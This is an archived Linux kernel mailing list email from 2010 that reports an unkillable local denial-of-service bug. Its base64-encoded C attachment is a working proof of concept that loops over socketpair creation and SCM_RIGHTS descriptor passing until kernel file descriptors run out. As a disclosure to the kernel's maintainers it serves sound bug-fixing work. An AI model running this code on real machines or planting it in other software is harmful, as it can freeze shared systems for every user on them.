Return-Path: <linux-kernel-owner@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1751245Ab0KYF6D (ORCPT <rfc822;w@1wt.eu>);
	Thu, 25 Nov 2010 00:58:03 -0500
Received: from mail-bw0-f46.google.com ([209.85.214.46]:37393 "EHLO
	mail-bw0-f46.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
	with ESMTP id S1751029Ab0KYF6B (ORCPT
	<rfc822;linux-kernel@vger.kernel.org>);
	Thu, 25 Nov 2010 00:58:01 -0500
DomainKey-Signature: a=rsa-sha1; c=nofws;
        d=gmail.com; s=gamma;
        h=mime-version:date:message-id:subject:from:to:content-type;
        b=WH9TQNicmGLmmABV1bgs/kVo5QHdP4mQ0+duNSJbDuik+9Tbo9L/TsNqK1qcuYyC+g
         Q5/IXGTmTJdg2bVpicUO0+Gf4TiiImIdrsCg9zqWufKLfHMiOGAbU/GXLG2SF1bSFvKB
         f5pAr8J0IuKA1gzHC31ptCehB1oswoLwYhufk=
MIME-Version: 1.0
Date: Thu, 25 Nov 2010 10:57:58 +0500
Message-ID: <AANLkTikCeddPFRGojPGuB6oq3xGYgovtm8r4=WhjEDpe@mail.gmail.com>
Subject: Simple kernel attack using socketpair. easy, 100% reproductiblle,
 works under guest. no way to protect :(
From: =?UTF-8?B?0JzQsNGA0Log0JrQvtGA0LXQvdCx0LXRgNCz?= 
	<socketpair@gmail.com>
To: linux-kernel@vger.kernel.org
Content-Type: multipart/mixed; boundary=0016e6d7edbab959c50495da4928
Sender: linux-kernel-owner@vger.kernel.org
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org

--0016e6d7edbab959c50495da4928
Content-Type: text/plain; charset=UTF-8

Simple kernel attack using socketpair. easy, 100% reproductiblle,
works under guest. no way to protect :(

See source attached.

Process become in state 'Running' but not killalble via kill -KILL.

eat 100% CPU, eat all available internal  file descriptors  in kernel :(

-- 
Segmentation fault

--0016e6d7edbab959c50495da4928
Content-Type: text/x-csrc; charset=US-ASCII; name="sp.c"
Content-Disposition: attachment; filename="sp.c"
Content-Transfer-Encoding: base64
X-Attachment-Id: f_ggx8az690

I2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4KI2luY2x1ZGUgPHN5cy91bi5oPgoKc3RhdGljIGludCBz
ZW5kX2ZkIChpbnQgdW5peF9mZCwgaW50IGZkKQp7CiAgc3RydWN0IG1zZ2hkciBtc2doOwogIHN0
cnVjdCBjbXNnaGRyICpjbXNnOwogIGNoYXIgYnVmW0NNU0dfU1BBQ0UgKHNpemVvZiAoZmQpKV07
CgogIG1lbXNldCAoJm1zZ2gsIDAsIHNpemVvZiAobXNnaCkpOwogIG1lbXNldCAoYnVmLCAwLCBz
aXplb2YgKGJ1ZikpOwoKICBtc2doLm1zZ19jb250cm9sID0gYnVmOwogIG1zZ2gubXNnX2NvbnRy
b2xsZW4gPSBzaXplb2YgKGJ1Zik7CgogIGNtc2cgPSBDTVNHX0ZJUlNUSERSICgmbXNnaCk7CiAg
Y21zZy0+Y21zZ19sZW4gPSBDTVNHX0xFTiAoc2l6ZW9mIChmZCkpOwogIGNtc2ctPmNtc2dfbGV2
ZWwgPSBTT0xfU09DS0VUOwogIGNtc2ctPmNtc2dfdHlwZSA9IFNDTV9SSUdIVFM7CgogIG1zZ2gu
bXNnX2NvbnRyb2xsZW4gPSBjbXNnLT5jbXNnX2xlbjsKCiAgbWVtY3B5IChDTVNHX0RBVEEgKGNt
c2cpLCAmZmQsIHNpemVvZiAoZmQpKTsKICByZXR1cm4gc2VuZG1zZyAodW5peF9mZCwgJm1zZ2gs
IDApOwp9CgoKaW50IG1haW4gKCkKewogIGludCBmZFsyXSwgZmZbMl07CiAgaW50IHRhcmdldDsK
CiAgaWYgKHNvY2tldHBhaXIgKFBGX1VOSVgsIFNPQ0tfU0VRUEFDS0VULCAwLCBmZCk9PS0xKQog
ICAgcmV0dXJuIDE7CgogIGZvciAoOzspCiAgewogICAgaWYgKHNvY2tldHBhaXIgKFBGX1VOSVgs
IFNPQ0tfU0VRUEFDS0VULCAwLCBmZik9PS0xKQoJcmV0dXJuIDI7CiAgICBzZW5kX2ZkIChmZlsw
XSwgZmRbMF0pOwogICAgc2VuZF9mZCAoZmZbMF0sIGZkWzFdKTsKICAgIGNsb3NlIChmZFsxXSk7
CiAgICBjbG9zZSAoZmRbMF0pOwogICAgZmRbMF0gPSBmZlswXTsKICAgIGZkWzFdID0gZmZbMV07
CiAgfQp9Cg==
--0016e6d7edbab959c50495da4928--
